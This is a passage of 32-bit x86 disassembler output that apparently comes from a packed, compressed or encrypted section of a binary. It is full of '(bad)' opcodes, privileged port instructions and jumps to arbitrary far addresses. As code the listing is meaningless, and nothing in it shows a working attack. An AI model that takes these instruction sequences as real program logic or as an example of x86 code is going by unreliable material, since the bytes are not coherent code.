  4129d1:	mov    WORD PTR [edx],cs
  4129d3:	sar    ch,0x74
  4129d6:	add    DWORD PTR [esi+esi*1],edi
  4129d9:	inc    ecx
  4129da:	(bad)  
  4129dc:	mov    bl,0x87
  4129de:	jmp    0x6a1a:0xf7cbea65
  4129e5:	adc    BYTE PTR [ecx+ebx*2+0x70f2a065],0x4
  4129ed:	fidiv  WORD PTR [edx-0x38a1f367]
  4129f3:	leave  
  4129f4:	xlat   BYTE PTR ds:[ebx]
  4129f5:	aas    
  4129f6:	jmp    0x412a10
  4129f8:	cmp    eax,0xd7f68fc0
  4129fd:	add    ecx,DWORD PTR ds:0x3f72b478
  412a03:	adc    cl,ch
  412a05:	inc    esi
  412a06:	pop    es
  412a07:	dec    edx
  412a08:	mov    bh,BYTE PTR [edi+0x78]
  412a0b:	ja     0x4129e3
  412a0d:	pop    es
  412a0e:	add    BYTE PTR [ebp-0x2019f57d],al
  412a14:	outs   dx,DWORD PTR ds:[esi]
  412a15:	(bad)  
  412a16:	sbb    edx,ecx
  412a18:	int3   
  412a19:	mov    cl,0x68
  412a1b:	shr    dl,0x4b
  412a1e:	sbb    al,0xda
  412a20:	mov    ebp,0x79f1f935
  412a25:	jne    0x4129fd
  412a27:	sub    ah,dl
  412a29:	cmp    ecx,DWORD PTR [edx+0x56]
  412a2c:	lods   eax,DWORD PTR ds:[esi]
  412a2d:	mov    al,ds:0x8ac0bebf
  412a32:	iret   
  412a33:	fldenv [eax+0x6323717a]
  412a39:	fcomp  QWORD PTR [ebp+0x5d]
  412a3c:	fs js  0x4129c9
  412a3f:	sub    al,0xdd
  412a41:	xor    bh,BYTE PTR [edi-0x38e6a4cc]
  412a47:	pusha  
  412a48:	test   al,0x5b
  412a4a:	in     al,dx
  412a4b:	retf   
  412a4c:	sbb    BYTE PTR [esp+edx*2-0x8fdfad],ah
  412a53:	mov    esp,0x5e1b2bc6
  412a58:	fs out 0xb3,al
  412a5b:	xor    eax,0x40630fc0
  412a60:	and    edi,DWORD PTR [eax-0x45fe6a5a]
  412a66:	inc    edi
  412a67:	jp     0x412a26
  412a69:	dec    ebx
  412a6a:	ds jo  0x412a16
  412a6d:	or     al,0x2b
  412a6f:	aad    0x8d
  412a71:	cmc    
  412a72:	xchg   edi,eax
  412a73:	arpl   WORD PTR [ebx+0x68],dx
  412a76:	dec    edx
  412a77:	sbb    cl,al
  412a79:	jmp    DWORD PTR [eax-0xbffc97a]
  412a7f:	push   edi
  412a80:	inc    ecx
  412a81:	xchg   ebp,eax
  412a82:	cdq    
  412a83:	jnp    0x412afb
  412a85:	push   ecx
  412a86:	jl     0x412a72
  412a88:	mov    ah,0x95
  412a8a:	test   al,0x3b
  412a8c:	or     ah,BYTE PTR [ebx+eax*1-0x55411b52]
  412a93:	cmp    al,0x22
  412a95:	popa   
  412a96:	mov    bh,0xe6
  412a98:	xor    al,0x30
  412a9a:	mov    al,BYTE PTR [ebp+eax*2+0x6be3a00]
  412aa1:	xlat   BYTE PTR ds:[ebx]
  412aa2:	lods   al,BYTE PTR ds:[esi]
  412aa3:	pop    ecx
  412aa4:	out    0xcb,al
  412aa6:	or     al,0xc4
  412aa8:	ja     0x412ace
  412aaa:	mov    dh,0x96
  412aac:	data16 mov WORD PTR [ebp-0x27b85870],fs
  412ab3:	into   
  412ab4:	add    al,0x40
  412ab6:	sub    edx,DWORD PTR [edi-0x3f]
  412ab9:	push   cs
  412aba:	xor    DWORD PTR ds:0x7206219f,ecx
  412ac0:	in     eax,dx
  412ac1:	push   ds
  412ac2:	aas    
  412ac3:	data16 sbb ah,BYTE PTR [ecx-0x3c95b270]
  412aca:	in     al,0xcb
  412acc:	scas   al,BYTE PTR es:[edi]
  412acd:	aaa    
  412ace:	add    DWORD PTR [edi],ebp
  412ad0:	repz xor ecx,eax
  412ad3:	xor    DWORD PTR ss:[esi],eax
  412ad6:	xchg   dx,ax
  412ad8:	jne    0x412aa0
  412ada:	or     DWORD PTR [edi+0x6a],eax
  412add:	test   DWORD PTR [eax+0x1f],0xc14168e0
  412ae4:	dec    ebp
  412ae5:	gs aaa 
  412ae7:	jg     0x412a7a
  412ae9:	arpl   WORD PTR [ebx],di
  412aeb:	push   edx
  412aec:	push   ebx
  412aed:	and    al,dh
  412aef:	icebp  
  412af0:	stos   BYTE PTR es:[edi],al
  412af1:	enter  0xcf2b,0xf7
  412af5:	sbb    DWORD PTR [edx],edx
  412af7:	sub    al,0x96
  412af9:	cli    
  412afa:	je     0x412b18
  412afc:	add    esp,0xf2069abf
  412b02:	(bad)  
  412b03:	lahf   
  412b04:	pop    eax
  412b05:	push   esi
  412b06:	lods   al,BYTE PTR ds:[esi]
  412b07:	test   BYTE PTR [edi+0x4c],ah
  412b0a:	fst    DWORD PTR [ebp-0x3b2b39ec]
  412b10:	ror    BYTE PTR [ebp+0x4d],cl
  412b13:	sbb    ch,cl
  412b15:	int    0xd1
  412b17:	pushf  
  412b18:	and    cl,bh
  412b1a:	imul   eax,DWORD PTR [ebx+0x2d93c365],0x120c35e4
  412b24:	add    al,0x64
  412b26:	and    bl,0xd6
  412b29:	fild   WORD PTR [edx+0xa]
  412b2c:	push   esi
  412b2d:	lods   eax,DWORD PTR ds:[esi]
  412b2e:	ds jmp 0x412b8a
  412b31:	add    bh,BYTE PTR ds:0xfcdb8a09
  412b37:	ret    0x194d
  412b3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b3b:	and    al,0xaf
  412b3d:	ficom  WORD PTR [ebx-0x39]
  412b40:	adc    bh,al
  412b42:	adc    BYTE PTR [ebp+0x40],dh
  412b45:	inc    eax
  412b46:	fild   DWORD PTR [esi-0x31]
  412b49:	inc    esp
  412b4a:	inc    edi
  412b4b:	fdivp  st(2),st
  412b4d:	cmp    bh,BYTE PTR [edi]
  412b4f:	fld    QWORD PTR [esi]
  412b51:	and    BYTE PTR [edx-0x74fafbec],cl
  412b57:	and    BYTE PTR [edx-0x44096aef],dl
  412b5d:	and    ah,dh
  412b5f:	inc    edx
  412b60:	aaa    
  412b61:	in     al,dx
  412b62:	iret   
  412b63:	cmp    eax,0x953d4c55
  412b68:	scas   al,BYTE PTR es:[edi]
  412b69:	inc    esi
  412b6a:	pop    ss
  412b6b:	into   
  412b6c:	rcr    BYTE PTR [eax],0xa0
  412b6f:	mov    WORD PTR [ecx],?
  412b71:	cmp    al,0xab
  412b73:	push   edi
  412b74:	div    ebp
  412b76:	sub    eax,0x758ca6e4
  412b7b:	popa   
  412b7c:	pushf  
  412b7d:	and    eax,0x96ccc95a
  412b82:	push   cs
  412b83:	and    DWORD PTR [ecx-0x42],eax
  412b86:	xchg   edx,eax
  412b87:	test   DWORD PTR [edx+0x1d0727d1],eax
  412b8d:	add    al,0x0
  412b8f:	mov    dh,0xb5
  412b91:	jbe    0x412ba5
  412b93:	hlt    
  412b94:	aaa    
  412b95:	test   al,0xac
  412b97:	xor    eax,0x4cec6174
  412b9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b9d:	push   es
  412b9e:	stos   DWORD PTR es:[edi],eax
  412b9f:	enter  0x92ab,0x68
  412ba3:	mov    edx,0x39b3db2a
  412ba8:	mov    ah,0xb9
  412baa:	jge    0x412c04
  412bac:	and    ecx,DWORD PTR [ecx+0x78716ae7]
  412bb2:	in     al,dx
  412bb3:	js     0x412c0c
  412bb5:	cli    
  412bb6:	jbe    0x35c916b9
  412bbc:	test   al,0xb6
  412bbe:	add    BYTE PTR ds:0x5fd4f95a,cl
  412bc4:	dec    esi
  412bc5:	out    dx,al
  412bc6:	jae    0x412c01
  412bc8:	jle    0x412b9c
  412bca:	popf   
  412bcb:	mov    al,0x44
  412bcd:	xchg   edi,eax
  412bce:	sbb    ebx,0xe8e8c3a2
  412bd4:	push   ss
  412bd5:	adc    al,0xf5
  412bd7:	aas    
  412bd8:	inc    esi
  412bd9:	adc    dh,BYTE PTR ds:0x4ca228df
  412bdf:	jg     0x412bff
  412be1:	adc    edx,esi
  412be3:	xchg   edx,eax
  412be4:	outs   dx,DWORD PTR ds:[esi]
  412be5:	ins    BYTE PTR es:[edi],dx
  412be6:	pushf  
  412be7:	imul   ecx,DWORD PTR [esi],0x753c8c23
  412bed:	mov    DWORD PTR [edx-0x148fcd34],ecx
  412bf3:	test   al,0x2d
  412bf5:	scas   eax,DWORD PTR es:[edi]
  412bf6:	out    dx,al
  412bf7:	arpl   sp,dx
  412bf9:	xrelease mov BYTE PTR fs:[edi+0x3be6d57a],ch
  412c01:	scas   al,BYTE PTR es:[edi]
  412c02:	mov    ebx,0x63995d2e
  412c07:	je     0x412c66
  412c09:	stos   DWORD PTR es:[edi],eax
  412c0a:	mov    ds:0x48baef88,eax
  412c0f:	cli    
  412c10:	mov    dh,0x30
  412c12:	or     dl,BYTE PTR [eax]
  412c14:	mov    dl,0x52
  412c16:	retf   
  412c17:	xor    edx,ecx
  412c19:	pop    ds
  412c1a:	int    0x90
  412c1c:	call   0x3f7b620
  412c21:	adc    eax,0x116814d2
  412c26:	test   al,0xd9
  412c28:	pause  
  412c2a:	mov    esp,DWORD PTR [ebp-0x89ff744]
  412c30:	out    0x8a,al
  412c32:	push   edx
  412c33:	sahf   
  412c34:	sub    BYTE PTR ds:0x79a3b48f,dh
  412c3a:	repnz and BYTE PTR gs:[eax+0x60],dh
  412c3f:	aad    0x74
  412c41:	ret    
  412c42:	ja     0x412c6b
  412c44:	cmp    eax,0x64392539
  412c49:	mov    es,WORD PTR [ebx]
  412c4b:	fdivr  QWORD PTR [edi-0x74]
  412c4e:	xchg   esi,eax
  412c4f:	shr    bh,cl
  412c51:	add    BYTE PTR [esi],ah
  412c53:	mov    ebx,0x12942479
  412c58:	mov    esp,0x1bad66ad
  412c5d:	cmp    esp,DWORD PTR [ecx]
  412c5f:	adc    DWORD PTR [edx],ecx
  412c61:	stos   DWORD PTR es:[edi],eax
  412c62:	jp     0x412c25
  412c64:	xor    al,0xc2
  412c66:	(bad)  
  412c67:	rcl    dl,1
  412c69:	call   0x4183:0x2ffd62f0
  412c70:	push   eax
  412c71:	jno    0x412c7b
  412c73:	pop    esp
  412c74:	mov    eax,0xabc06739
  412c79:	test   al,0xbb
  412c7b:	mov    ds:0x725e49c4,eax
  412c80:	jns    0x412cef
  412c82:	icebp  
  412c83:	jge    0x412c73
  412c85:	test   BYTE PTR [ebx-0x42],0x61
  412c89:	mov    ah,0x33
  412c8b:	xor    bh,BYTE PTR [edx]
  412c8d:	or     ebp,DWORD PTR [ebx]
  412c8f:	dec    esp
  412c90:	or     eax,0xf74f0f49
  412c95:	and    ah,0x79
  412c98:	xchg   ecx,eax
  412c99:	fiadd  DWORD PTR [ebx]
  412c9b:	(bad)  
  412c9c:	mov    edx,0x15e6de38
  412ca1:	pop    ebp
  412ca2:	sub    al,0x62
  412ca4:	ficom  DWORD PTR [eax+esi*2]
  412ca7:	fisubr DWORD PTR [ebx-0x7ef0555e]
  412cae:	std    
  412caf:	je     0x412cdd
  412cb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cb2:	mov    dh,0xdb
  412cb4:	mov    fs,WORD PTR [esi-0x693a7899]
  412cba:	mov    eax,0xe0b3ff6
  412cbf:	or     BYTE PTR [edx],al
  412cc1:	jge    0x412c45
  412cc3:	dec    esp
  412cc4:	ror    edi,1
  412cc6:	pop    ebx
  412cc7:	out    dx,al
  412cc8:	hlt    
  412cc9:	js     0x412d44
  412ccb:	jmp    0x83f7742f
  412cd0:	sahf   
  412cd1:	aam    0x26
  412cd3:	adc    dh,ah
  412cd5:	mov    ds:0xdb501411,eax
  412cda:	inc    ebx
  412cdb:	clc    
  412cdc:	add    esp,ecx
  412cde:	test   BYTE PTR [ebp-0x7bc386ed],dh
  412ce4:	popf   
  412ce5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ce6:	cwde   
  412ce7:	xchg   esp,eax
  412ce8:	bound  ebx,QWORD PTR [edi+0x7b]
  412ceb:	call   0xd:0x4bc141ac
  412cf2:	inc    esp
  412cf3:	fcomp  DWORD PTR [eax+eiz*2]
  412cf6:	mov    eax,ds:0x26f1e21e
  412cfb:	jle    0x412d28
  412cfd:	icebp  
  412cfe:	repnz enter 0xcb9b,0xd4
  412d03:	rol    BYTE PTR [edx],1
  412d05:	in     al,dx
  412d06:	mov    fs,ebx
  412d08:	fstp   DWORD PTR [ecx+edi*8]
  412d0b:	mov    bl,0x3b
  412d0d:	int    0x7a
  412d0f:	pop    ebx
  412d10:	jp     0x412d1c
  412d12:	lahf   
  412d13:	out    0x46,al
  412d15:	pusha  
  412d16:	and    BYTE PTR [edi],bh
  412d18:	pusha  
  412d19:	mov    al,0xa8
  412d1b:	int    0x35
  412d1d:	dec    edi
  412d1e:	mov    ebx,0x862edc44
  412d23:	add    al,BYTE PTR [ecx-0x39416fb8]
  412d29:	bound  esp,QWORD PTR [edx]
  412d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d2c:	jno    0x412cd2
  412d2e:	jecxz  0x412d67
  412d30:	and    DWORD PTR [esi+0x25],ebx
  412d33:	pop    edx
  412d34:	aad    0xa5
  412d36:	cmp    bl,BYTE PTR [eax-0x2597ac0f]
  412d3c:	pop    esp
  412d3d:	fst    DWORD PTR [ebx]
  412d3f:	fiadd  DWORD PTR [esi+eiz*1]
  412d42:	xor    BYTE PTR [edx+0x34],dh
  412d45:	push   ds
  412d46:	leave  
  412d47:	ins    BYTE PTR es:[edi],dx
  412d48:	imul   esi,DWORD PTR [ebx+0x22],0xbf28cddb
  412d4f:	imul   ecx,DWORD PTR [edi*4-0x70f99b44],0xffffffa6
  412d57:	fld    QWORD PTR ds:[eax+edx*2+0x6af833c3]
  412d5f:	jmp    0x412d90
  412d61:	call   0x3be9:0xf2546dcf
  412d68:	inc    eax
  412d69:	push   ss
  412d6a:	sar    edi,cl
  412d6c:	(bad)  
  412d6d:	xchg   ebp,eax
  412d6e:	dec    ecx
  412d6f:	jno    0x412d34
  412d71:	dec    edi
  412d72:	jp     0x412d5b
  412d74:	cmovb  ebp,DWORD PTR [esp+edi*8-0x7d9d84c4]
  412d7c:	and    DWORD PTR [ecx-0xef2dd7b],ebp
  412d82:	ins    BYTE PTR es:[edi],dx
  412d83:	cdq    
  412d84:	and    esi,esi
  412d86:	jg     0x412d7f
  412d88:	mov    esi,DWORD PTR [edi]
  412d8a:	pop    DWORD PTR [ebx]
  412d8c:	(bad)  
  412d8d:	gs inc edi
  412d8f:	dec    esi
  412d90:	jle    0x412da0
  412d92:	xchg   ebx,eax
  412d93:	imul   ebx,DWORD PTR [edx+0xae1230b],0xf70af468
  412d9d:	loop   0x412d25
  412d9f:	sub    bh,BYTE PTR [edx-0x50ae2506]
  412da5:	push   0xb10db2b9
  412daa:	mov    bl,0x36
  412dac:	ror    BYTE PTR [ecx+eax*2-0x60c79c17],cl
  412db3:	and    ch,cl
  412db5:	(bad)  
  412db6:	jno    0x412e0b
  412db8:	arpl   WORD PTR [ecx],sp
  412dba:	xchg   edx,eax
  412dbb:	fs and eax,0x577f8716
  412dc1:	dec    ecx
  412dc2:	sub    BYTE PTR [edx+0x39519342],0x45
  412dc9:	mov    esi,0xdc0b452f
  412dce:	ret    
  412dcf:	mov    dh,0x52
  412dd1:	dec    WORD PTR [edx+0x174808d1]
  412dd8:	div    DWORD PTR [edx-0x72]
  412ddb:	ins    BYTE PTR es:[edi],dx
  412ddc:	icebp  
  412ddd:	cmp    eax,0x89b11b61
  412de2:	call   0xefbf:0xb79ce27e
  412de9:	push   ss
  412dea:	out    0xf8,eax
  412dec:	mov    ch,0x77
  412dee:	or     al,0x3a
  412df0:	inc    esi
  412df1:	loopne 0x412dd5
  412df3:	int3   
  412df4:	retf   
  412df5:	xor    esi,DWORD PTR [ebp+0xe]
  412df8:	adc    ebp,DWORD PTR [ecx+0x56]
  412dfb:	out    0xad,eax
  412dfd:	stc    
  412dfe:	out    0xd0,al
  412e00:	cmp    DWORD PTR [edi+esi*1-0x2a],0x7
  412e05:	imul   ebp,DWORD PTR [edi+0x66eab29d],0x1c04bc43
  412e0f:	xchg   ebp,eax
  412e10:	and    al,ah
  412e12:	sub    DWORD PTR [ecx+0x14],esi
  412e15:	out    0xa7,al
  412e17:	pop    ss
  412e18:	mov    bl,0x88
  412e1a:	sub    al,0x25
  412e1c:	bound  ebp,QWORD PTR cs:[ebx-0x7b]
  412e20:	out    dx,eax
  412e21:	jbe    0x412e82
  412e23:	test   al,0x4e
  412e25:	or     DWORD PTR [edi],ebp
  412e27:	or     eax,0xea8c19ad
  412e2c:	sbb    eax,0xf0612f28
  412e31:	(bad)  
  412e32:	fstp   QWORD PTR [esi]
  412e34:	pop    es
  412e35:	and    al,cl
  412e37:	jno    0x412e91
  412e39:	out    dx,al
  412e3a:	adc    eax,esi
  412e3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e3d:	xchg   esp,eax
  412e3e:	add    BYTE PTR [bx],ah
  412e41:	jl     0x412df3
  412e43:	and    BYTE PTR [edi+esi*4],al
  412e46:	cli    
  412e47:	mov    bl,0x22
  412e49:	bound  edx,QWORD PTR [esi-0x1afda3c3]
  412e4f:	mov    ch,0x52
  412e51:	ds pusha 
  412e53:	xchg   esp,eax
  412e54:	sbb    al,0x5d
  412e56:	daa    
  412e57:	jmp    0xa145a39f
  412e5c:	cmp    DWORD PTR ds:0x2f3630e9,esp
  412e62:	xchg   ebp,eax
  412e63:	xchg   ebp,eax
  412e64:	mov    ebp,0x10cca26
  412e69:	xor    al,BYTE PTR [esi]
  412e6b:	ficomp WORD PTR [ecx+0x400e3f9e]
  412e71:	stc    
  412e72:	test   eax,0x4371c21f
  412e77:	mov    bh,0xce
  412e79:	mov    dl,0x6a
  412e7b:	aad    0x10
  412e7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e7e:	add    eax,DWORD PTR [eax+ebx*4+0x7e73934a]
  412e85:	xchg   BYTE PTR [ecx],dl
  412e87:	clc    
  412e88:	cmp    DWORD PTR [ebx],edx
  412e8a:	mov    eax,0xfb40d2b6
  412e8f:	push   0x1672cb21
  412e94:	xchg   ecx,eax
  412e95:	out    0xb0,al
  412e97:	adc    ch,bl
  412e99:	hlt    
  412e9a:	mov    ah,BYTE PTR [edi]
  412e9c:	sbb    eax,0x51ad9058
  412ea1:	fsub   DWORD PTR [edx-0x3addeac0]
  412ea7:	adc    esi,DWORD PTR [eax+0x2b]
  412eaa:	or     eax,0x515a9b6
  412eaf:	fcomp  QWORD PTR [esi+eiz*1+0x6]
  412eb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eb4:	inc    eax
  412eb5:	add    DWORD PTR [edi-0x37d21b7c],esp
  412ebb:	daa    
  412ebc:	jbe    0x412f04
  412ebe:	ss dec ebp
  412ec0:	outs   dx,BYTE PTR ds:[esi]
  412ec1:	inc    eax
  412ec2:	retf   
  412ec3:	out    dx,al
  412ec4:	into   
  412ec5:	cs pushf 
  412ec7:	mov    ecx,cs
  412ec9:	dec    ebp
  412eca:	xchg   esp,eax
  412ecb:	sbb    al,0x13
  412ecd:	inc    eax
  412ece:	add    eax,0x7cc5213a
  412ed3:	fwait
  412ed4:	xor    bl,dl
  412ed6:	retf   0x2e9d
  412ed9:	or     al,cl
  412edb:	fstp   TBYTE PTR [edx-0x4b837dcd]
  412ee1:	add    al,0x15
  412ee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ee4:	(bad)  
  412ee5:	stos   DWORD PTR es:[edi],eax
  412ee6:	mov    eax,ds:0x83bf941a
  412eeb:	add    dl,BYTE PTR [edx-0xd]
  412eee:	sahf   
  412eef:	(bad)  
  412ef0:	ucomiss xmm1,xmm0
  412ef3:	jnp    0x412f51
  412ef5:	add    al,0x73
  412ef7:	outs   dx,DWORD PTR ds:[esi]
  412ef8:	bound  esp,QWORD PTR [edi-0x3f]
  412efb:	jl     0xc1cc849c
  412f01:	adc    edx,ebx
  412f03:	cmp    DWORD PTR [edi+ebx*8],0xffffffa3
  412f07:	jp     0xd476c8e3
  412f0d:	lea    esp,[edx+0x4b]
  412f10:	outs   dx,DWORD PTR ds:[esi]
  412f11:	jecxz  0x412efc
  412f13:	mov    WORD PTR [edx-0x66ad95f7],gs
  412f19:	pop    eax
  412f1a:	cmp    eax,0x4662c40
  412f1f:	pusha  
  412f20:	sahf   
  412f21:	mov    bl,BYTE PTR ds:0x19e93a8f
  412f27:	clc    
  412f28:	adc    DWORD PTR [ecx+0x24],edx
  412f2b:	pop    ss
  412f2c:	xlat   BYTE PTR ds:[ebx]
  412f2d:	or     al,0xce
  412f2f:	sub    bl,BYTE PTR [edi]
  412f31:	repnz xchg edi,eax
  412f33:	mov    eax,ds:0xd8d18f26
  412f38:	sar    BYTE PTR [ebp-0x2b],0x75
  412f3c:	dec    esp
  412f3d:	jmp    0x412ec6
  412f3f:	out    0x56,al
  412f41:	mov    esi,0x4ed1b788
  412f46:	jnp    0x412fb3
  412f48:	leave  
  412f49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f4a:	stc    
  412f4b:	jae    0x412fad
  412f4d:	push   es
  412f4e:	leave  
  412f4f:	dec    ebx
  412f50:	cmp    BYTE PTR [edx],cl
  412f52:	loope  0x412fb2
  412f54:	mov    bh,dl
  412f56:	cmp    esp,esp
  412f58:	dec    ecx
  412f59:	leave  
  412f5a:	and    DWORD PTR [eax],esi
  412f5c:	xor    edi,DWORD PTR [ebx-0x2]
  412f5f:	and    dh,BYTE PTR [edx+0x1f6145ee]
  412f65:	or     eax,0x2cacb7fe
  412f6a:	int3   
  412f6b:	popa   
  412f6c:	out    dx,eax
  412f6d:	stc    
  412f6e:	call   0x2be44dca
  412f73:	mov    ah,0x5d
  412f75:	mov    WORD PTR ds:0xb5aec99c,es
  412f7b:	xchg   DWORD PTR [ebp-0x5e],edi
  412f7e:	dec    edx
  412f7f:	jmp    FWORD PTR [eax-0x4d4511e5]
  412f85:	sbb    dh,ch
  412f87:	sub    esi,DWORD PTR [edi+0x54]
  412f8a:	jae    0x412fd6
  412f8c:	mov    eax,0x583a535b
  412f91:	jnp    0x412fd9
  412f93:	add    BYTE PTR [edx-0x80],bl
  412f96:	not    DWORD PTR [ebx]
  412f98:	xchg   esp,eax
  412f99:	lods   al,BYTE PTR ds:[esi]
  412f9a:	jae    0x412f88
  412f9c:	fild   WORD PTR [ebx-0x1c]
  412f9f:	or     al,0x9e
  412fa1:	imul   ebx,DWORD PTR [edx+0x7e],0xe0b70233
  412fa8:	nop
  412fa9:	scas   eax,DWORD PTR es:[edi]
  412faa:	add    al,dl
  412fac:	cmp    esp,eax
  412fae:	mov    ch,BYTE PTR [ebx+eax*8-0x2a]
  412fb2:	and    al,0xf1
  412fb4:	lds    edi,FWORD PTR [ebp-0x54f1deea]
  412fba:	dec    ebx
  412fbb:	pop    ebx
  412fbc:	mov    edi,0x5e1ecbcc
  412fc1:	call   0x8d74f04c
  412fc6:	test   ebx,ebx
  412fc8:	scas   eax,DWORD PTR es:[edi]
  412fc9:	nop
  412fca:	mov    ds:0x62ab8def,al
  412fcf:	sti    
  412fd0:	jp     0x41302c
  412fd2:	sar    DWORD PTR [ebp-0x7],0x8c
  412fd6:	mov    ah,0x9e
  412fd8:	mov    esp,DWORD PTR [edx+0x64]
  412fdb:	in     al,dx
  412fdc:	push   cs
  412fdd:	push   ss
  412fde:	aaa    
  412fdf:	in     eax,dx
  412fe0:	xchg   esi,eax
  412fe1:	push   edi
  412fe2:	xchg   ebp,eax
  412fe3:	ss ret 0xc824
  412fe7:	mov    WORD PTR [ebp+ecx*4+0x48],fs
  412feb:	jnp    0x413006
  412fed:	ret    0xa822
  412ff0:	add    edi,edx
  412ff2:	pop    esi
  412ff3:	pop    edx
  412ff4:	pop    es
  412ff5:	hlt    
  412ff6:	add    DWORD PTR [ebp+0x69],esp
  412ff9:	daa    
  412ffa:	cmp    eax,0x3dc0b113
  412fff:	or     bh,BYTE PTR [ebx+0x3f]
  413002:	lock dec esi
  413004:	outs   dx,DWORD PTR ds:[esi]
  413005:	sbb    al,0xdc
  413007:	inc    ebx
  413008:	(bad)  
  413009:	jp     0x41305c
  41300b:	mov    eax,ds:0x199522dd
  413010:	cdq    
  413011:	jb     0x413077
  413013:	fwait
  413014:	mov    ah,BYTE PTR [esi+0x4]
  413017:	shr    BYTE PTR [ebp-0x5e],cl
  41301a:	jnp    0x41300e
  41301c:	fbstp  TBYTE PTR [edi]
  41301e:	imul   BYTE PTR [ebp+0x31bb3fc5]
  413024:	ins    DWORD PTR es:[edi],dx
  413025:	adc    eax,0xe6217480
  41302a:	xor    DWORD PTR [edx+0x49],ecx
  41302d:	(bad)  
  41302f:	ret    0x4bb8
  413032:	out    0x40,al
  413034:	xor    al,0xb2
  413036:	pop    esi
  413037:	test   DWORD PTR [esi+eax*8-0x6fbba1ab],0x215c6e58
  413042:	fwait
  413043:	out    0xa2,al
  413045:	mov    ds:0xb741010f,eax
  41304a:	adc    al,0xf6
  41304c:	and    cl,BYTE PTR [edx+eiz*4]
  41304f:	(bad)  
  413050:	js     0x413084
  413052:	push   ecx
  413053:	popf   
  413054:	leave  
  413055:	aad    0x7c
  413057:	mov    ah,0x20
  413059:	paddw  mm0,mm7
  41305c:	add    DWORD PTR [eax],esp
  41305e:	sbb    dl,bh
  413060:	cmp    eax,eax
  413062:	pop    esi
  413063:	mov    al,0x4f
  413066:	and    DWORD PTR [ecx],esp
  413068:	jmp    0x41304a
  41306a:	sbb    BYTE PTR [edi+ebx*2-0x5f527c69],bh
  413071:	sub    esi,DWORD PTR [ebp-0x54]
  413074:	pop    ebx
  413075:	xchg   ebp,eax
  413076:	adc    BYTE PTR [ecx+ecx*4+0x71],cl
  41307a:	(bad)  
  41307c:	out    dx,al
  41307d:	xor    ch,BYTE PTR [edx+ecx*4-0x6928b0c7]
  413084:	addr16 mov ebx,0x9565459e
  41308a:	pop    ebx
  41308b:	cmp    ch,BYTE PTR [ecx+0x3f]
  41308e:	push   es
  41308f:	leave  
  413090:	and    ecx,DWORD PTR [ebx+0x2f]
  413093:	popf   
  413094:	repnz sbb eax,0x8349f249
  41309a:	xchg   DWORD PTR [ecx],edx
  41309c:	pop    edx
  41309d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41309e:	xor    ah,BYTE PTR [ebp-0x78025cd2]
  4130a4:	adc    eax,0xc60149
  4130a9:	inc    eax
  4130aa:	(bad)  
  4130ac:	jmp    0xc696:0x74cebfdb
  4130b3:	dec    esi
  4130b4:	dec    edx
  4130b5:	lods   eax,DWORD PTR ds:[esi]
  4130b6:	mov    esi,0x2d2f1a89
  4130bb:	jmp    0x413082
  4130bd:	xchg   esi,eax
  4130be:	call   0xccdd410b
  4130c3:	mov    BYTE PTR [ecx+ebp*8],0x59
  4130c7:	daa    
  4130c8:	call   0xd553c635
  4130cd:	add    DWORD PTR ds:0xedc7d575,esi
  4130d3:	test   al,0xd4
  4130d5:	jno    0x4130cf
  4130d7:	sub    al,0x89
  4130d9:	dec    esp
  4130da:	and    al,0xc4
  4130dc:	out    0x3d,al
  4130de:	sbb    bl,dh
  4130e0:	aam    0xeb
  4130e2:	mov    al,ds:0x80a40f4f
  4130e7:	xlat   BYTE PTR ds:[ebx]
  4130e8:	rol    bh,0x27
  4130eb:	rcl    DWORD PTR [esi-0x2d679c14],cl
  4130f1:	loop   0x413100
  4130f3:	int3   
  4130f4:	cli    
  4130f5:	inc    esi
  4130f6:	data16 xor ch,BYTE PTR [esi]
  4130f9:	or     al,0x54
  4130fb:	call   0xec10e657
  413100:	inc    edi
  413101:	(bad)  
  413102:	mov    ebp,ss
  413104:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413105:	add    ecx,esp
  413107:	dec    ebp
  413108:	jne    0x413159
  41310a:	dec    edx
  41310b:	pusha  
  41310c:	xchg   edx,eax
  41310d:	mov    ds,WORD PTR [ebx]
  41310f:	out    dx,eax
  413110:	pop    ebx
  413111:	mov    ebp,0x2b196a64
  413116:	fwait
  413117:	retf   
  413118:	sbb    ebp,ecx
  41311a:	xor    al,BYTE PTR [esi]
  41311c:	mov    ebp,0x75efcbee
  413121:	xor    eax,DWORD PTR [edi+0x39daee66]
  413127:	xchg   esi,eax
  413128:	push   ecx
  413129:	int3   
  41312a:	pop    edi
  41312b:	icebp  
  41312c:	mov    eax,ds:0x27fc4faf
  413131:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413132:	ror    BYTE PTR [ebp+0x8],0x49
  413136:	or     ch,BYTE PTR [esi]
  413138:	loopne 0x4130e4
  41313a:	adc    dl,BYTE PTR [ebx+0xa]
  41313d:	xchg   ebp,eax
  41313e:	sahf   
  41313f:	cmp    DWORD PTR [edx+edx*4+0x6b6a08a1],0xd5dee710
  41314a:	dec    esp
  41314b:	push   ecx
  41314c:	enter  0x9b5b,0xf1
  413150:	inc    eax
  413151:	je     0x413164
  413153:	hlt    
  413154:	push   esi
  413155:	adc    BYTE PTR [eax-0xd],bl
  413158:	push   ss
  413159:	in     al,dx
  41315a:	out    dx,al
  41315b:	push   0x28
  41315d:	and    BYTE PTR [ebp-0x386e472d],ah
  413163:	mov    ch,0x1
  413165:	xchg   ebx,eax
  413166:	int    0x34
  413168:	fild   DWORD PTR [ebp+0x1f07a6d]
  41316e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41316f:	fisttp QWORD PTR [esi-0x6fcb86d]
  413175:	in     al,0xb1
  413177:	mov    eax,0x1deafb07
  41317c:	loope  0x413137
  41317e:	les    edx,FWORD PTR [eax-0x50]
  413181:	pop    ss
